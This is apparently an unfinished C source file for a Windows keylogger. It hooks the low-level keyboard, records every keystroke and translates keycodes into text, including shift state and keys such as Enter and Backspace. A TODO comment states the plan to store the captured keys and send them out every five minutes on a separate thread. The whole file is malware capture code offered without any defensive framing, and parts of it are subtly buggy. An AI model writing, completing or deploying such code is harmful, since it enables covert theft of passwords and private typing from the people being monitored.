#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#include "keylog.h"
HHOOK kbdhook;
int capsOn;

void showText(LPSTR text);

int addMessageToBuffer(char *c, int length)
{
    //code here
    return 0;
}

//argvs
//charCode - the virtual keycode used by windows to indicate which key was involved in the message.
//c - a pointer to the buffer which we will store the translated key in.

char* returnLetterCase(DWORD charCode, char * c) // returns null terminated string containing char
{
    c[0] = '\0';

    if(capsOn == 1)
        c[0] = (char)charCode;
    else
        c[0] = (char)charCode+32;

    c[1] = '\0';

    return c;
}

char* returnNumberSymbol(DWORD charCode, char * c) // Doesn't return symbol, just key and whether shift was on.
{
    c[0] = '\0';

    if(capsOn == 0)
    {
        memcpy(c, "[^", 2);
        c[2] = (char)charCode;
        c[3] = '\0';
    }
    else
    {
        memcpy(c, "[^SH", 4);
        itoa(charCode, &c[4], 10);
        c[5] = '\0';
    }

    return c;
}

char* returnSpecialKey(DWORD charCode, char * c)
{
    c[0] = '\0';

    if (charCode == VK_SHIFT || charCode == 161 || charCode == 160) // if shift is down, turn caps on
        capsOn = 1;

    else if(charCode == VK_CAPITAL || charCode == 20) //reverse caps
    {
        if(capsOn == 0)
            capsOn = 1;
        else
            capsOn = 0;
    }

    switch(charCode) //this is going to be really big.
    {
        case 20: //the default will catch these and return their digits if we don't break here.
            break;
        case 160:
            break;
        case 161:
            break;
        case 32:
            memcpy(c, " ", sizeof(" "));
            break;
        case 13:
            memcpy(c, "<ENTER>", sizeof("<ENTER>"));
            break;
        case 8:
            memcpy(c, "<BACK>", sizeof("<BACK>"));
            break;
        default:
            memset(c, 0, 8);
            c[0] = '[';
            c[1] = '^';
            itoa(charCode, &c[2], 10);
    }


    return c;
}

LRESULT CALLBACK LLKeyboardProc(int nCode, WPARAM wp, LPARAM lp)
{
    KBDLLHOOKSTRUCT k = *(KBDLLHOOKSTRUCT *)lp;
    char c[8];

    if(nCode < 0)
        return CallNextHookEx(kbdhook, nCode, wp, lp);

    if ((wp == WM_KEYDOWN && (k.vkCode >= 65 && k.vkCode <= 90))) //between 65 and 90 is a letter key
    {
        returnLetterCase(k.vkCode, c); //so send to letter function

        if(c[0] != '\0')
            showText(c);
    }
    else if ((wp == WM_KEYDOWN && (k.vkCode >= 48 && k.vkCode <= 57))) //between 48 and 57 is a digit key
    {
        returnNumberSymbol(k.vkCode, c); //number symbol function

        if(c[0] != '\0')
            showText(c);
    }
    else if (wp == WM_KEYUP) //we only care about one key going up, shift.
    {
        if(k.vkCode == VK_SHIFT || k.vkCode == 161 || k.vkCode == 160) //VK_SHIFT only applies to keyboards with one shift key, 160 is right shift, 161, left.
        {
            if(capsOn == 0)
                memcpy(&c, "<SH UP>", sizeof("<SH UP>"));
        }
    }
    else
    {
        returnSpecialKey(k.vkCode, c); //other..

        if(c[0] != '\0')
            showText(c);
    }

    //TODO: implement a storage and transport system. we could store after a certain buffer, then have a transport system every 5 minutes on another thread.
    // Fucking Threads man.

    return CallNextHookEx(kbdhook, nCode, wp, lp);
}
